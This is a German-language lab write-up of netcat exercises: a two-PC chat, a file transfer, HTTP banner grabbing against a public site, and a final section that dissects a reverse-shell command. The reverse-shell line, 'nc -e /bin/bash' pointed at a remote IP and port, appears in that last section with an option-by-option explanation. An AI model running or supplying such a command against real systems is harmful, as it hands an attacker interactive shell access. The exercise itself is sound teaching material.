## Übung (netcat chat)
Die Aufgabe ist eine bidirektionalen Chat zwischen zwei Rechnern aufzubauen. Dazu muss man netcat verwenden.

|IP-Adresse|Computer|
|----------|--------|
|192.168.13.51|PC-A|
|192.168.13.52|PC-B|

**Befehl am PC-A**
```sh
nc -lvp 1234
```

**Befehl am PC-B**
```sh
$ nc 192.168.13.51 1234
```
Hier wurde die IP-Adresse des anderen Rechners eingegeben und auf den Port 1234 gehorcht. Nun kann man alle Textzeichen die in den Chat geschrieben werden sehen.

## Übung (netcat data send)
Nun soll man über den Chat eine Textdatei übertragen, welche der andere dann abspeichern kann. 
Dazu muss der Sender im vorhinein ein Textfile mit Inhalt erstellt haben.

**Befehl am PC-A**
```sh
$ nc -lvp 1234 > empfangen.txt
```

**Befehl am PC-B**
```sh
$ nc 192.168.13.51 1234 < text.txt
```
Nun kann man am PC-A das File öffnen

## Übung (netcat banner grabbing II)
Jetzt soll die Übung so erweitert werden, dass die HTTP-Anfrage nicht über STDIN läuft, sondern per Pipe

**Befehl und Ausgabe:**
```sh
$ printf "<Iregendein nicht zulässiger Befehl>\r\n\r\n" | nc orf.at 80
HTTP/1.1 400 Bad Request
Date: Mon, 13 Apr 2026 10:43:13 GMT
Server: Apache
Content-Length: 226
Connection: close
Content-Type: text/html; charset=iso-8859-1
 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
</body></html>
```
Dies funktioniert mittels "printf". Das zweifache ausführen von "\r\n" dient dazu um das Eingeben der zwei leeren Zeilen auszuführen.

## Übung (netcat reverse shell)
Nun soll man den gegebenen Befehl analysieren.
```sh
nc -e /bin/bash 10.20.30.40 4242
```
|Option|Bedeutung|
|------|---------|
|-e /bin/bash|Wird benutzt um eine Shell zu starten|
|10.20.30.40|Ziel-IP|
|4242|Ziel-Port|

Bei der Reverse-Shell schickt das Ziel an den Angreifer eine Anfrage, was somit schwerer zu blockieren ist.
